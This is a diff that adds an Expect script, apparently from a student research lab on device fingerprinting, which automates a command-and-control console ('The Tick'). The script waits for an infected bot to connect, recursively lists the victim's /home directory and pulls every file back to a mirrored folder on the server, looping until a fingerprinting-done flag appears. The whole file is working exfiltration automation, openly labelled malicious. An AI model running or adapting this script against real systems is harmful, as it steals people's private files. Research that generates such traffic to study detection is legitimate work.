@@ -1,0 +1,117 @@
+#!/usr/bin/expect -f
+
+puts "\r** START MALICIOUS PROCESS **\r\r"
+
+set stolen_files_folder_location [lindex $argv 0]
+
+# Activate the Conda environment within Expect
+spawn bash 
+send "source ~/anaconda3/bin/activate py27\r"
+expect "$ "
+
+# start tick console
+send "python /home/patrik/BA/thetick/tick.py \r"
+expect "$ "
+
+
+# wait until bot has connected
+set timeout 30
+expect {
+    -re {Bot [0-9]+ \[[^\]]+\] connected from [0-9.]+} {
+        puts "\r✅ Bot connected.\r"
+	set timeout 10
+    }
+    timeout {
+        puts "\r❌ Timeout waiting for bot connection.\r"
+        exit 1
+    }
+}
+sleep 5
+
+
+# select bot 0 to work with
+send "\ruse 0\r"
+expect -re {\[.*\]}
+
+
+# Procedure to list files and pull from a given absolute path
+proc traverse {dir stolen_files_folder} {
+    puts "\r==> Scanning directory: $dir\r"
+    
+    # Run `exec ls -l <dir>`
+    send "exec ls -l $dir\r"
+    set timeout 100000000000    
+    expect {
+    	-re {total(.*)\[.*\]} {
+		puts "matched output\n"
+		set output $expect_out(buffer);
+	}
+    	timeout {
+        	puts "\rTimeout occurred\n"
+    	}
+    }
+
+    # Parse each line
+    set lines [split $output "\n"]
+    foreach line $lines {
+        if {[regexp {^total} $line] || $line eq ""} {
+            continue
+        }
+
+        set fields [regexp -all -inline {\S+} $line]
+        if {[llength $fields] < 9} {
+            continue
+        }
+
+        set perms [lindex $fields 0]
+        set size [lindex $fields 4]
+        set name [lindex $fields end]
+        set fullpath "$dir/$name"
+ 	puts "\rPath: $fullpath	\r"
+	# check if the item is a directory (permissions start with d)
+	# if so recursively traverse folder
+        if {[string index $perms 0] eq "d"} {
+		set add_folder_to_stolen_files $stolen_files_folder$fullpath
+		file mkdir $add_folder_to_stolen_files
+        	traverse $fullpath $stolen_files_folder 
+        } elseif {[string index $perms 0] eq "l" || $size == 0} {
+		# skip if the file is linked or is empty --> leads to 'cannot stat' errors
+		continue		
+	}  else {
+            puts "\r-> Pulling file: $fullpath ($size bytes)\r"
+	    
+	    set save_to $stolen_files_folder$fullpath
+            send "pull $fullpath $save_to\r"
+
+	    # set custom timeout length to accustom long waits for file pulling
+	    set timeout [expr {($size / 16) * 600}]
+            expect -re {\[Bot.*\]}
+        }
+    }
+    
+    # check if fp is finished
+    send "exec cat /home/admin/BA/config/fp_done.flag\r"
+    set timeout 3
+    expect {
+		"fp finished successfully" {
+			puts "\rfingerprinting finished, stopping malicious behavior\r"
+			exit 0
+		}
+		timeout {
+			puts "\rfp still running \r"
+		}
+	}
+}
+
+# runs indefinitely, script is stopped when fp has completed on client device
+while 1>0 {
+ 	# the malicious behavior starts stealing data in the '/home' directory
+	# to store the data the folders are mirrored on the server
+	set starting_folder "/home"
+	set first_stolen_folder $stolen_files_folder_location$starting_folder
+	file mkdir $first_stolen_folder
+	
+	# start malicious behavior
+	traverse $starting_folder $stolen_files_folder_location
+}
+
